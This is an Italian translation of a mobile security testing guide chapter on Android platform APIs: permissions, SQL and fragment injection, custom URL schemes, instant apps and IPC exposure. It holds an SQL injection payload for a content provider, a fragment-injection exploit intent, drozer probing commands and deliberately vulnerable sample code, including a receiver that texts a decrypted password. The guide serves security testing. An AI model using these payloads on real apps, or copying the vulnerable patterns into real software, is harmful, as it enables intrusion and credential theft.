# Android Platform APIs

## Testing App Permissions (MSTG-PLATFORM-1)

Android assegna una system identity diversa (user ID e group ID Linux) a ogni app installata.
Poichè ogni app Android opera in una sandbox, le app devono chiedere esplicitamente accesso alle risorse e ai dati che sono al di fuori della propria sandbox.
Richiedono quest'accesso dichiarando i permessi di cui hanno bisogno per usare questi dati e feature di sistema.
In base a quanto i dati o le feature richiesti sono sensibili o critici, il sistema Android darà i permessi in modo automatico o chiederà l'approvazione all'utente.

I permessi Android sono classificati in quattro diverse categorie sulla base del livello di protezione che offrono:

- Normal: 
questa permission dà all'app accesso a feature isolate ad app-level con rischio minimo per le altre app, l'utente e il sistema
- Dangerous: 
questa permission di solito dà all'app il controllo sui dati utente o il controllo sul device per tutto ciò che riguarda l'utente stesso
- Signature: 
la permission viene data solo se l'app richiedente è firmata con lo stesso certificato usato per firmare l'app che ha dichiarato la permission.
Se la firma è verificata, la permission viene data automaticamente
- SystemOrSignature: 
questa permission viene data solo alle app embedded nella system image o firmate con lo stesso certificato usato per firmare l'app che ha dichiarato la permission

#### Activity Permission Enforcement

Le permission sono applicate tramite l'attributo `android:permission` nel tag `<activity>` nel manifest.
Queste permission restringono le applicazioni che possono lanciare l'activity.
Queste permission vengono verificate durante `Context.startActivity` e `Activity.startActivityForResult`.
Se non si posseggono le permission richieste viene lanciata una `SecurityException`.

#### Service Permission Enforcement

Le permission applicate tramite l'attributo `android:permission` nel tag `<service>` nel manifest restringono chi può avviare o agganciarsi al service.
La permission viene verificata durante `Context.startService`, `Context.stopService` e `Context.bindService`.
Se non si posseggono le permission richieste viene lanciata una `SecurityException`.

#### Broadcast Permission Enforcement

Le permission applicate tramite l'attributo `android:permission` nel tag `<receiver>` restringono chi può inviare messaggi broadcast al `BroadcastReceiver`.
Le permission vengono verificate dopo che il metodo `Context.sendBroadcast` è terminato.
Se non si posseggono le permission richieste tuttavia non viene lanciata un'exception, ma semplicemente il messaggio broadcast non viene inviato.

Una permission può essere passata al `Context.registerReceiver` per controllare chi può inviare messaggi broadcast verso un receiver registrato a livello di codice.
Diversamente, una permission può essere fornita alla chiamata di `Context.sendBroadcast` per restringere quali broadcast receiver possono ricevere il messaggio broadcast.

Nota che sia un receiver che un broadcaster possono richiedere una permission.
In questo caso, entrambi i controlli di permission devono essere verificati per l'intent per poter essere associato al target.

#### Content Provider Permission Enforcement

Le permission applicate tramite l'attributo `android:permission` nel tag `<provider>` restringono l'accesso ai dati di un ContentProvider.
I content provider hanno un'importante facility aggiuntiva di sicurezza chiamata URI permission.
Diversamente dagli altri componenti, i ContentProvider hanno due attributi di permission separati che possono essere impostati,
`android:readPermission` restringe chi può leggere dal provider,
e `android:writePermission` restringe chi può scrivere su di esso.
Se un ContentProvider è protetto sia con permessi di lettura che di scrittura, il possesso del solo permesso di scrittura non dà anche i permessi di lettura.

Queste permission sono date quando si recupera un provider (se non si ha la permission, viene lanciata una `SecurityException`), o quando si eseguono operazioni sul provider.
L'uso di `ContentResolver.query` richiede il possesso dei permessi di lettura;
L'uso di `ContentResolver.insert`, `ContentResolver.update` e `ContentResolver.delete` richiede il possesso dei permessi di scrittura.
Viene lanciata una `SecurityException` se non si posseggono le permission adeguate.

#### Content Provider URI Permissions

Il sistema standard di permission non è sufficiente quando viene usato con i content provider.
Per esempio un content provider potrebbe limitare le permission alla sola lettura per proteggersi, usando URI custom per recuperare informazioni.
Un app dovrebbe avere solo le permission per quella specifica URI.

La soluzione sono le permission per-URI.
Quando si avvia o si restiuisce il risutato di un'activity, il metodo può impostare `Intent.FLAG_GRANT_READ_URI_PERMISSION` e/o `Intent.FLAG_GRANT_WRITE_URI_PERMISSION`.
In questo modo si dà la permission all'activity per la specifica URI indipendentemente se ha le permission per accedere ai dati dal content provider.
Si realizza un modello comune secondo capability in cui le interazioni dell'utente portano alla concessione ad-hoc di permission fine-grained.
Ciò può ridurre le permission richieste dalle app a quelle direttamente collegate al loro comportamento.
Senza l'impiego di questo modello, utenti malevoli potrebbero accedere agli allegati di email di altri membri o recuperare una lista di contatti tramite URI non protette.
Nel manifest l'attributo `android:grantUriPermissions` o il node aiutano a restringere le URI.

#### Custom Permissions

Android consente alle app di esporre i propri service/component ad altre app.
Le custom permission sono necessarie per accedere ai componenti esposti dall'app.
Puoi definire custom permission nell'`AndroidManifest.xml` creando un tag permission con due attributi obbligatori: `android:name` e `android:protectionLevel`.

É cruciale creare custom permission che aderiscano al Principle of Least Privilege: la permission andrebbe definita esplicitamente per il suo scopo, con una label e una descrizione significativa e accurata.

### Static Analsysis

Controlla le permission per assicurarti che l'app ne abbia effettivamente bisogno e rimuovi quelle non necessarie.
Per esempio, la permission `INTERNET` nel file AndroidManifest.xml è necessaria per un Activity di caricamento di una pagina web in una WebView.
Dato che un utente può revocare una permission dangerous per un'app, lo sviluppatore dovrebbe controllare se l'app ha le permission appropriate ogni volta che un action che richiede la permission viene eseguita.

```xml
<uses-permission android:name="android.permission.INTERNET" />
```

Analizza le permission insieme allo sviluppatore per identificare il motivo del loro utilizzo e rimuovi quelle non necessarie.
Oltre ad analizzare manualmente il file AndroidManifest.xml, puoi usare il Android Asset Packaging Tool per esaminare le permission.

```sh
$ aapt d permissions com.owasp.mstg.myappp
uses-permission: android.permission.WRITE_CONTACTS
uses-permission: android.permission.CHANGE_CONFIGURATION
uses-permission: android.permission.SYSTEM_ALERT_WINDOW
uses-permission: android.permission.INTERNAL_SYSTEM_WINDOW
```

\# FIXME prova comando aapt

#### Custom Permissions

Oltre a imporre delle permission custom tramite il file AndroidManifest.xml, puoi anche controllare le permission a livello di codice.
Questo approccio non è raccomandato, perchè è error-prone e può essere raggirato più facilmente, ad esempio tramite runtime instrumentation.
Si raccomanda di invocare il metodo `ContextCompat.checkSelfPermission` per controllare se un'activity ha una permission specifica.
Quando trovi del codice come quello che segue, assicurati che le stesse permission siano imposte nel file AndroidManifest.xml.

```java
private static final String TAG = "LOG";

int canProcess = checkCallingOrSelfPermission("com.example.perm.READ_INCOMING_MSG");

if (canProcess != PERMISSION_GRANTED)
	throw new SecurityException();
```

Oppure col metodo `ContextCompat.checkSelfPermission` che fa un confronto col contenuto del file AndroidManifest.xml.

```java
if (ContextCompat.checkSelfPermission(secureActivity.this, Manifest.READ_INCOMING_MSG)
	!= PackageManager.PERMISSION_GRANTED) {
		//!= stands for not equals PERMISSION_GRANTED
		Log.v(TAG, "Permission denied");
}
```

#### Requesting Permissions

Se l'app ha delle permission che devono essere richieste a runtime, deve invocare il metodo `requestPermissions` per ottenerle.
L'app passa le permission necessarie e un codice di richiesta che il programmatore ha specificato all'utente asincronamente, il processo termina una volta che l'utente ha accettato o rifiutato la richiesta.
Dopo che la risposta viene restituita lo stesso codice di richiesta viene passato alla callback dell'app.

```java
private static final String TAG = "LOG";

// We start by checking the permission of the current Activity
if (ContextCompat.checkSelfPermission(secureActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
	!= PackageManager.PERMISSION_GRANTED) {
	// Permission is not granted
	// Should we show an explanation?
	if (ActivityCompat.shouldShowRequestPermissionRationale(secureActivity.this,
			//Gets whether you should show UI with rationale for requesting permission.
			//You should do this only if you do not have permission and the permission requested rationale is not communicated clearly to the user.
		Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
			// Asynchronous thread waits for the users response.
			// After the user sees the explanation try requesting the permission again.
	} else {
		// Request a permission that doesn't need to be explained.
		ActivityCompat.requestPermissions(
			secureActivity.this, 
			new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 
			MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE);
		// MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE will be the app-defined int constant.
		// The callback method gets the result of the request.
	}
} else {
	// Permission already granted debug message printed in terminal.
	Log.v(TAG, "Permission already granted.");
}
```

Nota che se devi fornire informazioni o spiegazioni all'utente, è necessario farlo prima della chiamata al metodo `requestPermissions`, dato che il dialog box non può essere modificato una volta invocato.

#### Handling Responses to Permission Requests

L'app deve fare l'override del metodo `onRequestPermissionsResult` per verificare se la permission è stata data.
Questo metodo riceve l'integer `requestCode` come parametro (che è lo stesso codice di richiesta che è stato creato in `requestPermissions`).
La seguente callback potrebbe usare `WRITE_EXTERNAL_STORAGE`.

```java
@Override //Needed to override system method onRequestPermissionsResult()
public void onRequestPermissionsResult(int requestCode, //requestCode is what you specified in requestPermissions()
	String permissions[], int[] permissionResults) {
		switch (requestCode) {
			case MY_PERMISSIONS_WRITE_EXTERNAL_STORAGE: {
				if (grantResults.length > 0
					&& permissionResults[0] == PackageManager.PERMISSION_GRANTED) {
						// 0 is a canceled request, if int array equals requestCode permission is granted.
				} else {
					// permission denied code goes here.
					Log.v(TAG, "Permission denied");
				}
				return;
			}
			// Other switch cases can be added here for multiple permission checks.
		}
}
```

Le permission dovrebbero essere richieste per ogni permission necessaria, anche se una permission simile dello stesso gruppo è già stata richiesta.
Per esempio se `READ_EXTERNAL_STORAGE` e `WRITE_EXTERNAL_STORAGE` sono presenti in AndroidManifest.xml ma solo la permission per `READ_EXTERNAL_STORAGE` viene data, allora quando viene richiesta la permission per `WRITE_EXTERNAL_STORAGE` viene subito approvata senza richiederla all'utente.
Questo avviene perchè le due permission appartengono allo stesso gruppo e non sono richieste esplicitamente.

#### Permission Analysis

Verifica sempre se l'app richiede permission di cui ha effettivamente bisogno.
Assicurati che non vengano richieste permission che non hanno a che fare con l'obiettivo dell'app.
Per esempio: un gioco single player che richiede accesso a `android:permission.WRITE_SMS`, potrebbe non essere una buona idea.

### Dynamic Analysis

Le permission per app già installate possono essere recuperate con Drozer.

```sh
dz> run app.package.info -a com.android.mms.service

...

Uses Permissions:
- android.permission.RECEIVE_BOOT_COMPLETED
- android.permission.READ_SMS
- android.permission.WRITE_SMS
- android.permission.BROADCAST_WAP_PUSH
- android.permission.BIND_CARRIER_SERVICES
- android.permission.BIND_CARRIER_MESSAGING_SERVICE
- android.permission.INTERACT_ACROSS_USERS
Defines Permissions:
- None
```

Quando le app Android expongono component IPC ad altre app, possono definire delle permission per controllare quali app possono accedere ai component.
Per le comunicazioni con un component protetto con una permission `normal` o `dangerous`, Drozer può essere configurato per includere le permission richieste:

```sh
$ drozer agent build --permission android.permission.REQUIRED_PERMISSION
```

Nota che questo metodo non può essere usato per permission di livello `signature` dato che Drozer dovrebbe essere firmato con il certificato usato per firmare l'app target.

Durante la dynamic analysis: verifica se la permission richiesta dall'app sia effettivamente necessaria all'app.

### Testing for Injection Flaws (MSTG-PLATFORM-2)

Le app Android possono esporre delle funzionalità attraverso URL scheme custom (che sono parte degli intent).
Possono esporre funzionalità a:

- altre app (tramite i meccanismi IPC, come intent, binder, Android Shared Memeory o broadcast receiver)
- l'utente (tramite l'user interface)

Nessuno degli input provenienti da queste entità può esssere considerato fidato;
deve essere validato e/o sanificato.
La validazione assicura l'elaborazione di soli dati che l'app si aspetta.
Se la validazione non viene imposta, qualsiasi input può essere inviato all'app, ciò potrebbe consentire a un attaccante o a un app malevola di sfruttare la funzionalità dell'app.

Le seguenti porzioni di codice sorgente dovrebbero essere controllate se una funzionalità dell'app è esposta:

- URL scheme custom:
verifica anche il test case "Testing Custom URL Schemes" per altri scenari
- meccanismi di IPC (intent, binder, Android Shared Memory o broadcaster receiver):
verifica anche il test case "Testing Whether Sensitive Data Is Exposed via IPC Mechanisms" per altri scenari
- interfaccia utente

Un esempio di meccanismo di IPC vulnerabile è riportato di seguito.
Puoi usare ContentProvider per accedere alle informazioni del database, e puoi interrogare i service per vedere se ritornano dati.
Se i dati non vengono validati adeguatamente, il content provider potrebbe essere vulnerabile a SQL Injection.
Vediamo un'implementazione di ContentProvider vulnerabile.

```xml
<provider
	android:name=".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation"
	android:authorities="sg.vp.owasp_mobile.provider.College">
</provider>
```

Ispezioniamo la funzione `query` in `OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java`.

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection,String[] selectionArgs, String sortOrder) {
	SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
	qb.setTables(STUDENTS_TABLE_NAME);

	switch (uriMatcher.match(uri)) {
		case STUDENTS:
			qb.setProjectionMap(STUDENTS_PROJECTION_MAP);

			break;
		case STUDENT_ID:
			// SQL Injection when providing an ID
			qb.appendWhere( _ID + "=" + uri.getPathSegments().get(1));
			Log.e("appendWhere",uri.getPathSegments().get(1).toString());

			break;
		default:
			throw new IllegalArgumentException("Unknown URI " + uri);
	}

	if (sortOrder == null || sortOrder == ""){
		/**
		* By default sort on student names
		*/
		sortOrder = NAME;
	}

	Cursor c = qb.query(db, projection, selection, selectionArgs,null, null, sortOrder);
	
	/**
	* register to watch a content URI for changes
	*/
	c.setNotificationUri(getContext().getContentResolver(), uri);
	
	return c;
}
```

L'utente deve specificare un valore per STUDENT_ID per `content://sg.vp.owasp_mobile.provider.College/students`.
La query è comunque vulnerabile a SQL Injection.
Bisogna usare i prepared statement per proteggersi dalle SQL Injection, ma bisogna applicare ugualmente l'input validation in modo da elaborare solo input che l'app si aspetta.

Tutte le funzioni dell'app che ricevono dati provenienti dalla UI dovrebbero implementare l'input validation:

- per input da UI si può usare Android Saripaar v2
- per input da IPC o URL scheme, bisogna creare una funzione di validazione.
Per esempio la seguente verifica se la stringa è alfanumerica

```java
public boolean isAlphaNumeric(String s){
	String pattern= "^[a-zA-Z0-9]*$";
	return s.matches(pattern);
}
```

Un'alternativa alle funzioni di validazione sono le type conversion, come ad esempio se ci si aspetta un intero si può usare `Integer.parseInt`.

### Dynamic Analysis

Il tester dovrebbe verificare manualmente gli input field con stringhe come `OR 1=1--` se ad esempio è stata individuata una vulnerabilità di local SQL Injection.
Su un device rooted, il comando `content` può essere usato per richiedere i dati da un content provider.
Il seguente comando interroga la funzione vulnerabile descritta prima.

```sh
# content query --uri content://sg.vp.owasp_mobile.provider.College/students
```

Le SQL Injection possono essere sfruttate con il seguente comando.
Infatti, invece di ottenere il solo record di Bob, puoi recuperare tutti i dati memorizzati.

```sh
# content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
```

## Testing for Fragment Injection (MSTG-PLATFORM-2)

L'Android SDK offre agli sviluppatori un modo per presentare una `Preference Activity` agli utenti, consentendo di estendere e adatarre questa classe astratta.
Questa classe analizza i campi dei dati extra di un intent, `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` e `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)`.
Il primo campo contiene il nome della classe `Fragment`, e il secondo contiene il bundle di input passato al `Fragment`.

Dato che `PreferenceActivity` usa la reflection per caricare il fragment, potrebbe essere caricata una classe arbitraria nel package o nell'Android SDK.
La classe caricata viene eseguita all'interno del context dell'app che esporta l'activity.
Sfruttando questa vulnerabilità, un attaccante può invocare fragment all'interno dell'app target o eseguire codice presente in altri costruttori delle classi.
Qualsiasi classe che sia passata all'intent e che non estenda la classe Fragment causerebbe una `java.lang.CastException`, ma il costruttore vuoto verrebbe eseguito prima che l'exception venga lanciata, consentendo al codice presente nel costruttore della classe di essere eseguito.

Per impedire questa vulnerabilità, un nuovo metodo chiamato `isValidFragment` è stato aggiunto in Android 4.4.
Consente agli sviluppatori di farne l'override e di definire i fragment che possono essere usati in questo contesto.
L'implementazione di default restituisce `true` nelle versioni precedenti ad Android 4.4;
lancia un'exception nelle versioni successive.

### Static Analysis

Passi:

- controlla se `android:targetSdkVersion` è inferiore a 19
- individua le activity esportate che estendono la classe `PreferenceActivity`
- verifica se il metodo `isValidFragment` è stato sovrascritto
- se l'app imposta il suo `android:targetSdkVersion` nel manifest a un valore inferiore a 19 e la classe vulnerabile non contiene alcuna implementazione di `isValidFragment`, allora la vulnerabilità è ereditata da `PreferenceActivity`
- per rimediare, gli sviluppatori dovrebbero aggiornare `android:targetSdkVersion` a 19 o superiore.
Diversamente, se `android:targetSdkVersion` non può essere aggiornata, gli sviluppatori dovrebbero implementare `isValidFragment` come descritto prima

Il seguente esempio mostra un'activity che estende `PreferenceActivity`:

```java
public class MyPreferences extends PreferenceActivity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	}
}
```

I seguenti esempi mostrano l'override del metodo `isValidFragment` con un'implementazione che consente il caricamento della sola classe `MyPreferenceFragment`:

```java
@Override
protected boolean isValidFragment(String fragmentName)
{
	return "com.fullpackage.MyPreferenceFragment".equals(fragmentName);
}
```

#### Example of Vulnerable App and Exploitation

MainActivity.class

```java
public class MainActivity extends PreferenceActivity {
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	}
}
```

MyFragment.class

```java
public class MyFragment extends Fragment {
	public void onCreate (Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	}

	public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
		View v = inflater.inflate(R.layout.fragmentLayout, null);
		WebView myWebView = (WebView) wv.findViewById(R.id.webview);

		myWebView.getSettings().setJavaScriptEnabled(true);
		myWebView.loadUrl(this.getActivity().getIntent().getDataString());

		return v;
	}
}
```

Per sfruttare quest'activity vulnerabile, puoi creare un'app con il seguente codice:

```java
Intent i = new Intent();

i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");

Intent intent = i.setData(Uri.parse("https://security.claudio.pt"));
startActivity(i);
```

## Testing Custom URL Schemes (MSTG-PLATFORM-3)

Sia Android che iOS consentono le comunicazioni tra app tramite URL scheme custom.
Queste consentono alle altre app di eseguire specifiche azioni all'interno dell'app che offre l'URL schema custom.
Le URI custom possono avere un qualsiasi prefix, e di solito definiscono un action da eseguire all'interno dell'app e i suoi parametri.

Considera questo esempio inventato: `sms://compose/to=your.boss@company.com&message=I%20QUIT!&sendImmediately=true`.
Quando una vittima clicca su questo link da un device mobile, l'app vulnerabile invia un SMS con un contenuto malevolo.
Ciò potrebbe portare a:

- perdite finanziarie per la vittima
- disclosure del numero di cellulare della vittima se i messaggi sono inviati a indirizzi predefiniti che collezionano numeri di telefono

Una volta che l'URL schema è stato definito, più app possono registrarsi per gli scheme disponibili.
Per ogni app, ognuna di queste URL scheme custom deve essere enumerata e le action che eseguono devono essere testate.

Le URL scheme possono essere usate per deep linking, un modo molto diffuso e conveniente per lanciare un'app nativa tramite link, che non è implicitamente rischioso.
Alternativamente, dall'API level 23 possono essere usati gli app link.
Gli app link, in contrasto con i deep link, necessitano di un dominio in cui il link venga servito in modo da avere un digital asset link.
Prima viene chiesto all'app di verificare l'asset link tramite `android:autoVerify="true"` nell'intentfiler.

Tuttavia, i dati elaborati dall'app e che provengono dalle URL scheme dovrebbero essere validati come qualsiasi content:

- quando si usa un tipo persistente reflection-based per l'elaborazione dei dati, verifica la sezione "Testing Object Persistence" per Android
- vengono usati i dati per le query? assicurati che siano query parametrizzate
- vengono usati dati per azioni autenticate? assicurati che l'utente sia autenticato prima che i dati vengano elaborati
- se i dati alterati influenzano il risultato del calcolo: aggiungi un HMAC sui dati

### Static Analysis

Verifica se vengono usate URL scheme custom.
Puoi farlo analizzando l'AndroidManifest.xml cercando element intent-filter.

```xml
<activity android:name=".MyUriActivity">
	<intent-filter>
		<action android:name="android.intent.action.VIEW" />
		<category android:name="android.intent.category.DEFAULT" />
		<category android:name="android.intent.category.BROWSABLE" />
		<data android:scheme="myapp" android:host="path" />
	</intent-filter>
</activity>
```

L'esempio precedente specifica un nuovo URL schema `myapp://`.
La category `browsable` permette all'URI di essere aperta tramite un browser.

I dati possono essere trasmessi attraverso questo nuovo schema, per esempio, la seguente URI: `myapp://path/to/what/i/want?keyOne=valueOne&keyTwo=valueTwo`.
Il seguente codice può essere usato per recuperare i dati:

```java
Intent intent = getIntent();
if (Intent.ACTION_VIEW.equals(intent.getAction())) {
	Uri uri = intent.getData();
	String valueOne = uri.getQueryParameter("keyOne");
	String valueTwo = uri.getQueryParameter("keyTwo");
}
```

Verifica l'uso di `toUri`, che potrebbe anche essere usato in questo contesto.

### Dynamic Analysis

Per enumerare le URL scheme all'interno dell'app che possono essere invocate tramite un web browser, usare il modulo Drozer `scanner.activity.browsable`:

```sh
dz> run scanner.activity.browsable -a com.google.android.apps.messaging
Package: com.google.android.apps.messaging
	Invocable URIs:
		sms://
		mms://
	Classes:
		com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
```

Puoi invocare un'URL schema custom con il modulo Drozer `app.activity.start`.

```sh
dz> run app.activity.start --action android.intent.action.VIEW --data-uri "sms://0123456789"
```

Quando invoca lo schema definito (`myapp://someaction/?var0=string&var1=string`), il modulo potrebbe anche essere usato per inviare dati all'app, come nell'esempio che segue:

```java
Intent intent = getIntent();
if (Intent.ACTION_VIEW.equals(intent.getAction())) {
	Uri uri = intent.getData();
	String valueOne = uri.getQueryParameter("var0");
	String valueTwo = uri.getQueryParameter("var1");
}
```

La definizione e l'uso di URL schema possono essere rischiosi in questa situazione se i dati sono inviati alle URL scheme dall'esterno ed elaborati dall'app.
Quindi tieni presente che i dati devono essere validati come descritto in "Testing Custom URL Schemes".

## Testing for Insecure Configuration of Instant Apps (MSTG-ARCH-1, MSTGARCH-
7)

Con Google Play Instant puoi creare le Instant app.
Un'instant app può essere lanciata direttamente da un browser o tramite il "try now" button dell'app store a partire da Android 6.0.
Non è necessaria alcuna installazione.
Ci sono alcune restrizioni per le instant app:

- c'è un limite sulla dimensione dell'app (max 10 MB)
- può essere usato solo un numero ristretto di permission

La loro combinazione può portare a situazioni insicure, come:
rimozione eccessiva della logica di autenticazione/autorizzazione/confidenzialità dall'app, che potrebbe portare a information leakage.

Nota: le instant app necessitano di un App Bundle.

### Static Analysis

L'analisi statica può essere eseguita sia dopo aver fatto il reverse engineering di un'instant app scaricata o analizzando l'App Bundle.
Quando analizzi l'App Bundle, controlla se nell'AndroidManifest.xml viene specificato `dist:module dist:instant="true"` per un modulo (per la base o per uno specifico modulo con `dist:module`).
Poi, controlla per ogni entry point, quali sono impostati (tramite `<data android:path="<PATH/HERE>" />`).

Considerando gli entry point individuati, come faresti per una qualsiasi activity, controlla:

- ci sono dati elaborati dall'app che dovrebbero essere protetti? 
Sono protetti con gli adeguati controlli?
- le comunicazioni sono sicure?
- se sono necessarie funzionalità aggiuntive, vengono scaricati i controlli di sicurezza corretti?

### Dynamic Analysis

Ci sono diversi modi per analizzare un'instant app.
In tutti i casi, devi installare il supporto per le instant app e aggiungere l'eseguibile `ia` al tuo `$PATH`.
A tale scopo lancia il seguente comando:

```sh
$ cd path/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps'
```

Poi, aggiungi `path/to/android/sdk/extras/google/instantapps/ia` al tuo `$PATH`.

Successivamente, puoi testare un'instant app localmente su un device con Android 8.1 o successivo.
L'app può essere testata in diversi modi:

- testare l'app localmente: 
fai il deploy dell'app tramite Android Studio (e abilita la checkbox `Deploy as instant app`  nel Run/Configuration dialog) o 
fai il deploy usando questo comando `$ ia run output-from-build-command <app-artifact>`
- testare l'app usando la Play Console
	- carica l'App Bundle nella Google Play Console
	- prepara la bundle caricata per una release nella test track interna
	- accedi tramite un account di test interno, 
	lancia l'instant app da un link esterno o tramite il "try now" button nell'app store dall'account del tester

Ora che puoi testare l'app, controlla:

- se ci sono dati che necessitano di controlli di privacy e se i controlli vengono applicati
- se tutte le comunicazioni sono sufficientemente sicure
- se quando sono necessarie funzionalità aggiuntive, tutti i controlli di sicurezza siano scaricati

## Testing for Sensitive Functionality Exposure Through IPC (MSTGPLATFORM-4)

Durante l'implementazione delle mobile app, gli sviluppatori potrebbero usare tecniche tradizionali per IPC (come file condivisi o socket di rete).
Dovrebbero essere usate le funzionalità del sistema IPC offerto dalle piattaforme mobile, dato che sono molto più mature delle tecniche tradizionali.
L'uso dei meccanismi di IPC, senza considerare i problemi di sicurezza, potrebbe portare a information leak di informazioni sensibili.

I meccanismi IPC che possono esporre dati sensibili possono essere:

- binder
- service
- bound service
- AIDL
- intent
- content provider

### Static Analysis

Nell'AndroidManifest.xml tutte le activity, i service e i content provider inclusi nel codice sorgente devono essere dichiarati (diversamente il sistema non li riconoscere e non li esegue).
I broadcast receiver possono essere dichiarati nell'AndroidManifest.xml o creati dinamicamente.
Idetifica gli elementi:
`intent-filter`,
`service`,
`provider`,
`receiver`.

Un activity, un service o un content esportati possono essere acceduti da altre app.
Ci sono due modi per definire un componente come exported.
Il modo ovvio è impostare il tag `android:exported="true"`.
Il secondo modo consiste nel definire un `<intent-filter>` in un component (`<activity>`, `<service>`, `<receiver>`).
In questo modo il tag exported viene impostato automaticamente a true.
Per impedire a tutte le altre app di interagire con il component, assicurati che `android:exported="true"` e `<intent-filter>` non siano presenti nell'AndroidManifest.xml a meno che non siano necessari.

Ricorda che l'uso del tag `android:permission` limita l'accesso delle altre app al component.
Se il tuo IPC è creato per essere accessibile alle altre app, puoi applicare una security policy con un element `<permission>` e impostare un `android:ProtectionLevel` adeguato.
Quando si usa `android:permission` in un service, le altre app devono dichiarare il corrispondente element `<uses-permission>` nel proprio manifest per lanciare, fermare o agganciarsi al service.

Per maggiori informazioni sui content provider, fai riferimento al test case "Testing Whether Stored Sensitive Data Is Exposed via IPC Mechanisms" nel capitolo "Testing Data Storage".

Una volta identificata la lista dei meccanismi IPC, analizza il codice sorgente per vedere se vengono rivelate informazioni sensibili quando vengono usati questi meccanismi.
Per esempio, i content provider possono essere usati per accedere alle informazioni del database, e i service possono essere interrogati per verificare se restituiscono dati.
I broadcast receiver possono rivelare informazioni sensibili a seguito di interrogazione o di sniffing.

Di seguito si usano le app Sieve e Android Insecure Bank come esempio di identificazione di componenti IPC vulnerabili.

#### Activities

Nell'app Sieve, troviamo tre activity exported:

```xml
<activity android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" an
droid:name=".MainLoginActivity" android:windowSoftInputMode="adjustResize|stateVisible">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:fi
nishOnTaskLaunch="true" android:label="@string/title_activity_file_select" android:name=".FileSelectActivity"/>
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:fi
nishOnTaskLaunch="true" android:label="@string/title_activity_pwlist" android:name=".PWList"/>
```

Analizzando l'activity `PWList.java`, vediamo che questa offre la possibilità di elencare, aggiungere e rimuovere le chiavi.
Se la invochiamo direttamente, saremo in grado di raggirare la LoginActivity.
Si possono trovare maggiori falle con l'analisi dinamica.

#### Services

Nell'app Sieve, troviamo i due service esposti, identificati da `<service>`:

```xml
<service android:exported="true" android:name=".AuthService" android:process=":remote"/>
<service android:exported="true" android:name=".CryptoService" android:process=":remote"/>
```

Cerca nel codice sorgente la classe `android.app.Service`.
Facendo il reverse engineering dell'app, possiamo vedere che il service `AuthService` consente il cambio della password e la protezione dell'app tramite PIN.

```java
public void handleMessage(Message msg) {
	AuthService.this.responseHandler = msg.replyTo;
	Bundle returnBundle = msg.obj;
	int responseCode;
	int returnVal;

	switch (msg.what) {
		...
		case AuthService.MSG_SET /*6345*/:
			if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {
				responseCode = 42;

				if (AuthService.this.setKey(returnBundle.getString("com.mwr.example.sieve.PASSWORD"))){
					returnVal = 0;
				} else {
					returnVal = 1;
				}
			} else if (msg.arg1 == AuthService.TYPE_PIN) {
				responseCode = 41;

				if (AuthService.this.setPin(returnBundle.getString("com.mwr.example.sieve.PIN"))) {
					returnVal = 0;
				} else {
					returnVal = 1;
				}
			} else {
				sendUnrecognisedMessage();
				return;
			}
	}
}
```

#### Broadcast Receivers

Nell'app Android Insecure Bank, possiamo trovare un broadcast receiver identificato da `<receiver>`

```xml
<receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
	<intent-filter>
		<action android:name="theBroadcast"/>
	</intent-filter>
</receiver>
```

Cerca nel codice sorgente stringhe del tipo 
`sendBroadcast`, 
`sendOrderedBroadcast` e 
`sendStickyBroadcast`.
Assicurati che l'app non invii alcun dato sensibile.

Se un intent inviato o ricevuto solo all'intendo dell'app, si può usare un `LocalBroadcastManager` per impedire alle altre app di ricevere il messaggio broadcast.
In questo modo si riduce il rischio di rivelare informazioni sensibili.

Per capire meglio a quale scopo il receiver è stato creato, è necessario proseguire con l'analisi statica e cercare la classe `android.content.BroadcastReceiver` e il metodo `registerReceiver`, che sono usati per creare dinamicamente i receiver.

Il seguente estratto di codice sorgente dell'app mostra che il broadcast receiver scatena l'invio di un SMS contenente la password utente decifrata.

```java
public class MyBroadCastReceiver extends BroadcastReceiver {
	String usernameBase64ByteString;
	public static final String MYPREFS = "mySharedPreferences";

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		String phn = intent.getStringExtra("phonenumber");
		String newpass = intent.getStringExtra("newpass");

		if (phn != null) {
			try {
				SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
				final String username = settings.getString("EncryptedUsername", null);
				byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
				usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
				final String password = settings.getString("superSecurePassword", null);
				CryptoClass crypt = new CryptoClass();
				String decryptedPassword = crypt.aesDeccryptedString(password);
				String textPhoneno = phn.toString();
				String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
				SmsManager smsManager = SmsManager.getDefault();
